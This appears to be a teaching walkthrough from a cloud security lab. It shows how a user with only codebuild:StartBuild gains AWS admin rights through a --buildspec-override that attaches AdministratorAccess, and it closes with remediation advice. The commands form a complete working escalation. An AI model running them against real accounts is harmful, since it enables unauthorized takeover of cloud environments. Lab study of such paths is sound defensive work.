# Guided Walkthrough: Privilege Escalation via codebuild:StartBuild on Existing Project

This scenario demonstrates a privilege escalation vulnerability where a user with only `codebuild:StartBuild` permission can exploit an existing CodeBuild project that has a privileged service role attached. Unlike the PassRole+CreateProject attack (codebuild-001), this path does NOT require `iam:PassRole` or `codebuild:CreateProject` permissions, making it a more subtle and often overlooked escalation route.

The key to this attack is the `--buildspec-override` parameter in the `codebuild:StartBuild` API. This parameter allows an attacker to replace the project's default buildspec with arbitrary commands, even without permission to modify the project itself. When an existing project has an administrative or highly privileged role attached, the attacker can execute AWS CLI commands with those elevated permissions simply by triggering a build.

This vulnerability commonly appears in environments where developers are granted broad `codebuild:StartBuild` permissions for CI/CD workflows, but the organization hasn't considered that existing projects might have privileged roles that could be exploited through buildspec overrides.

## The Challenge

You start with credentials for `pl-prod-codebuild-002-to-admin-starting-user`. This IAM user has `codebuild:StartBuild` permission (along with helpful recon permissions `codebuild:ListProjects`, `codebuild:BatchGetProjects`, and `codebuild:BatchGetBuilds`), but notably does NOT have `iam:PassRole` or `codebuild:CreateProject`.

Your goal is to reach `AdministratorAccess` by exploiting the pre-existing `pl-prod-codebuild-002-to-admin-existing-project` CodeBuild project, which has the `pl-prod-codebuild-002-to-admin-project-role` (AdministratorAccess) attached as its service role.

Configure your terminal with the starting user credentials from Terraform output:

```bash
cd <pathfinding-labs-root>
MODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_codebuild_002_codebuild_startbuild.value')
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
unset AWS_SESSION_TOKEN
```

## Reconnaissance

First, confirm who you are and verify you lack admin permissions:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-codebuild-002-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — no admin permissions yet, as expected
```

Now look for CodeBuild projects in the account. Since you have `codebuild:ListProjects`, you can enumerate them directly:

```bash
aws codebuild list-projects --query 'projects[*]' --output json
```

You should see `pl-prod-codebuild-002-to-admin-existing-project` in the list. Use `codebuild:BatchGetProjects` to inspect it and find the attached service role:

```bash
aws codebuild batch-get-projects \
  --names pl-prod-codebuild-002-to-admin-existing-project \
  --query 'projects[0].serviceRole'
# "arn:aws:iam::<account_id>:role/pl-prod-codebuild-002-to-admin-project-role"
```

The project's service role is `pl-prod-codebuild-002-to-admin-project-role`. A role with this name is almost certainly privileged — it was created specifically for this scenario with `AdministratorAccess` attached. Any build running under this project executes with those admin permissions.

## Exploitation

The `codebuild:StartBuild` API accepts a `--buildspec-override` parameter that completely replaces the project's configured buildspec for that specific build run. You don't need to modify the project — you just supply different instructions at build-trigger time.

Craft a buildspec that attaches `AdministratorAccess` to your starting user, then fire the build:

```bash
MALICIOUS_BUILDSPEC=$(cat <<'EOF'
version: 0.2
phases:
  build:
    commands:
      - echo "Starting privilege escalation via buildspec override..."
      - aws iam attach-user-policy --user-name pl-prod-codebuild-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
      - echo "Successfully attached AdministratorAccess policy"
EOF
)

BUILD_RESULT=$(aws codebuild start-build \
  --project-name pl-prod-codebuild-002-to-admin-existing-project \
  --buildspec-override "$MALICIOUS_BUILDSPEC" \
  --output json)

BUILD_ID=$(echo "$BUILD_RESULT" | jq -r '.build.id')
echo "Build ID: $BUILD_ID"
```

The build will take 30-60 seconds to provision, execute, and complete. Poll its status:

```bash
aws codebuild batch-get-builds \
  --ids "$BUILD_ID" \
  --query 'builds[0].buildStatus' \
  --output text
# IN_PROGRESS ... then SUCCEEDED
```

Once the build status is `SUCCEEDED`, wait an additional 15 seconds for IAM policy propagation:

```bash
sleep 15
```

## Verification

Now confirm you have administrator access with your original starting user credentials:

```bash
aws iam list-users --max-items 3 --output table
```

If the table returns successfully, the `AdministratorAccess` managed policy has been attached to your user. The privilege escalation is complete.

## What Happened

You exploited two compounding weaknesses: a CodeBuild project with an overly-permissive service role (`AdministratorAccess`) and a user with broad `codebuild:StartBuild` permission that was not scoped to specific projects. The `--buildspec-override` parameter — designed to let CI/CD pipelines customize build instructions per-invocation — became the attack vector.

In a real environment this path appears whenever developers have project-wide `codebuild:StartBuild` access for convenience. Because the permission looks innocuous on its own (it just "starts builds"), security reviews often miss the amplification that occurs when an existing project runs under a privileged role. The fix requires either scoping `codebuild:StartBuild` to non-privileged projects by ARN, or ensuring that no CodeBuild project runs with a service role that can modify IAM.
